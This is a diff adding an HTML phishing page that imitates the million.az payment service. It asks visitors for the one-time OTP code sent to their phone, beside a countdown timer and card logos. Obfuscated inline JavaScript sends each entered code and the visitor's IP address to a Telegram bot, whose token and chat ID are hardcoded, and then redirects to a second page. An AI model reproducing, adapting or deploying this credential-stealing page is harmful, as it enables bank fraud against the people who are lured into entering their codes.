@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M10</title>
+    <link rel="stylesheet"
+        href="https://ysrex.github.io/millionazz/cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <!-- Font Awesome ikonları için -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 80px;
+            width: 70vw;
+            height: 70vh;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        input[type="number"] {
+            width: calc(100% - 16px);
+            padding: 20px;
+            border: 2px solid black;
+            border-radius: 40px;
+            box-sizing: border-box;
+            font-size: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 40px;
+            background-color: #cccccc;
+            color: #fff;
+            cursor: not-allowed;
+            font-size: 20px;
+            transition: background-color 0.3s ease;
+            margin-top: 30px;
+        }
+
+        button:enabled {
+            background-color: #45a049;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .bank-icons {
+            display: flex;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .bank-icons i {
+            font-size: 30px;
+            margin: 0 15px;
+            color: #888;
+            transition: color 0.3s ease;
+        }
+
+        .bank-icons i:hover {
+            color: #333;
+        }
+
+        .timer {
+            font-size: 3rem;
+            color: #333;
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
+        </div>
+        <div class="timer" id="timer">02:00</div>
+        <form id="myForm">
+            <div class="form-group">
+                <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
+                <label for="cardName">Şifrə göndərildi: +994*******</label>
+                <input type="number" id="cardName" placeholder="Otp Kod" maxlength="7" minlength="4" required>
+            </div>
+
+            <div style="text-align: center;">
+                <button type="button" id="submitButton" disabled>İləri <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </form>
+        <div class="bank-icons">
+            <i class="fab fa-cc-visa"></i>
+            <i class="fab fa-cc-mastercard"></i>
+            <i class="fab fa-cc-amex"></i>
+        </div>
+    </div>
+
+    <script>
+        var _0x2c3867 = _0x43f0; function _0x1fdf() { var _0x2475c2 = ['timer', 'getTime', 'catch', '2970459CjLtYR', 'IP\x20Adresi\x20Alınamadı:', 'error', 'click', 'https://api.telegram.org/bot', 'location', '6171255NtmvQA', '00:00', 'addEventListener', 'value', '1433852levWNO', '301teVrEo', 'trim', 'disabled', 'length', '34962LETCyy', 'floor', 'cardName', 'innerHTML', 'then', 'href', '7519053974:AAGmsaPlNPCGDHXT-H3Wt0sXqbtGRglIaUg', 'submitButton', '791849EMTrNq', 'POST', 'Otp-1:\x20', '42ZeQjSF', 'json', 'input', 'getElementById', 'https://api.ipify.org?format=json', '174276vIgyks', '7324184LAdJEs', '-4737595773', '\x0aIP:\x20', 'index2.html']; _0x1fdf = function () { return _0x2475c2; }; return _0x1fdf(); } (function (_0x26b8e2, _0x4b70c3) { var _0x457034 = _0x43f0, _0x464f30 = _0x26b8e2(); while (!![]) { try { var _0x1b6616 = -parseInt(_0x457034(0xda)) / 0x1 + -parseInt(_0x457034(0xf4)) / 0x2 + parseInt(_0x457034(0xdd)) / 0x3 * (parseInt(_0x457034(0xe2)) / 0x4) + parseInt(_0x457034(0xf0)) / 0x5 + parseInt(_0x457034(0xf9)) / 0x6 * (-parseInt(_0x457034(0xf5)) / 0x7) + parseInt(_0x457034(0xe3)) / 0x8 + -parseInt(_0x457034(0xea)) / 0x9; if (_0x1b6616 === _0x4b70c3) break; else _0x464f30['push'](_0x464f30['shift']()); } catch (_0x43a1c9) { _0x464f30['push'](_0x464f30['shift']()); } } }(_0x1fdf, 0xa3a91)); var startTime = new Date()[_0x2c3867(0xe8)](), endTime = startTime + 0x2 * 0x3c * 0x3e8, timerInterval = setInterval(function () { var _0x5245ab = _0x2c3867, _0x6500a2 = new Date()[_0x5245ab(0xe8)](), _0x6ce233 = endTime - _0x6500a2, _0x34355d = Math[_0x5245ab(0xfa)](_0x6ce233 % (0x3e8 * 0x3c * 0x3c) / (0x3e8 * 0x3c)), _0x147c6c = Math[_0x5245ab(0xfa)](_0x6ce233 % (0x3e8 * 0x3c) / 0x3e8); document[_0x5245ab(0xe0)](_0x5245ab(0xe7))[_0x5245ab(0xd5)] = formatTime(_0x34355d) + ':' + formatTime(_0x147c6c), _0x6ce233 < 0x0 && (clearInterval(timerInterval), document[_0x5245ab(0xe0)]('timer')[_0x5245ab(0xd5)] = _0x5245ab(0xf1), document['getElementById'](_0x5245ab(0xd9))[_0x5245ab(0xf7)] = !![]); }, 0x3e8); function formatTime(_0x24449e) { return _0x24449e < 0xa ? '0' + _0x24449e : _0x24449e; } document[_0x2c3867(0xe0)]('myForm')[_0x2c3867(0xf2)](_0x2c3867(0xdf), function () { var _0x8f342f = _0x2c3867, _0x2cca96 = document[_0x8f342f(0xe0)]('cardName')[_0x8f342f(0xf3)], _0x3ba60d = document[_0x8f342f(0xe0)]('submitButton'); _0x2cca96[_0x8f342f(0xf6)]()[_0x8f342f(0xf8)] >= 0x4 && _0x2cca96[_0x8f342f(0xf6)]()[_0x8f342f(0xf8)] <= 0x7 ? _0x3ba60d['disabled'] = ![] : _0x3ba60d[_0x8f342f(0xf7)] = !![]; }); const botToken = _0x2c3867(0xd8), chatId = _0x2c3867(0xe4); function _0x43f0(_0x2c6006, _0x14c909) { var _0x1fdf9f = _0x1fdf(); return _0x43f0 = function (_0x43f022, _0x2fc838) { _0x43f022 = _0x43f022 - 0xd4; var _0x20dbb2 = _0x1fdf9f[_0x43f022]; return _0x20dbb2; }, _0x43f0(_0x2c6006, _0x14c909); } document[_0x2c3867(0xe0)](_0x2c3867(0xd9))[_0x2c3867(0xf2)](_0x2c3867(0xed), function () { var _0x4dbed4 = _0x2c3867, _0x38edc1 = document[_0x4dbed4(0xe0)](_0x4dbed4(0xd4))['value']; fetch(_0x4dbed4(0xe1))['then'](_0x3a2d63 => _0x3a2d63[_0x4dbed4(0xde)]())[_0x4dbed4(0xd6)](_0x3402d9 => { var _0x1b9ea8 = _0x4dbed4; const _0x133718 = _0x3402d9['ip'], _0x3953df = _0x1b9ea8(0xdc) + _0x38edc1 + _0x1b9ea8(0xe5) + _0x133718; fetch(_0x1b9ea8(0xee) + botToken + '/sendMessage', { 'method': _0x1b9ea8(0xdb), 'headers': { 'Content-Type': 'application/json' }, 'body': JSON['stringify']({ 'chat_id': chatId, 'text': _0x3953df }) })[_0x1b9ea8(0xd6)](_0x3676c9 => { var _0x145c97 = _0x1b9ea8; window[_0x145c97(0xef)][_0x145c97(0xd7)] = _0x145c97(0xe6); })[_0x1b9ea8(0xe9)](_0x30cc88 => { var _0x13ff7d = _0x1b9ea8; console[_0x13ff7d(0xec)]('Telegram\x20Mesajı\x20Gönderme\x20Hatası:', _0x30cc88); }); })[_0x4dbed4(0xe9)](_0x40b80d => { var _0x7cbf13 = _0x4dbed4; console[_0x7cbf13(0xec)](_0x7cbf13(0xeb), _0x40b80d); }); });
+    </script>
+</body>
+
+</html>
